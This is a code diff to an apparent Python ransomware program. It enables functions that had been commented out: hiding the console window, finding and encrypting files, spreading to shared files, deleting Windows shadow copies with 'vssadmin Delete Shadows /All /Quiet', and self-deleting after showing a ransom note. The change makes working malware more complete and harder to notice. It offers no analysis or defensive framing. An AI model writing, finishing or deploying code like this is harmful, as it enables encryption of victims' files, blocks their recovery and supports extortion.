@@ -5,6 +5,9 @@ from Gui.gui import *
 from Components.ransom_note import *
 
 import sys
+import subprocess
+import win32gui
+import win32con
 import nmap
 from cryptography.fernet import Fernet
 
@@ -101,8 +104,9 @@ def ftp_spread():
 
 
 def dlt_shadow_copy():
+    cmd = 'vssadmin Delete Shadows /All /Quiet'
     try:
-        os.system('vssadmin Delete Shadows /All /Quiet')
+        subprocess.Popen(cmd, shell=False)
     except Exception:
         pass
 
@@ -120,15 +124,13 @@ def delete_ransomware():
 
 
 def main():
-    # hide = win32gui.GetForegroundWindow()
-    # win32gui.ShowWindow(hide, win32con.SW_HIDE)
+    hide = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(hide, win32con.SW_HIDE)
     sleep(5)
-
     virus_property()
     sleep(5)
-
-    # find_file()
-    # encrypt_file()
+    find_file()
+    encrypt_file()
     spread()
     find_shared_file()
     encrypt_shared_file()
@@ -136,10 +138,9 @@ def main():
     ransom_note()
     show_ransom_note()
     sleep(5)
-
     # ftp_spread()
-    # dlt_shadow_copy()
-    # delete_ransomware()
+    dlt_shadow_copy()
+    delete_ransomware()
 
 
 if __name__ == "__main__":
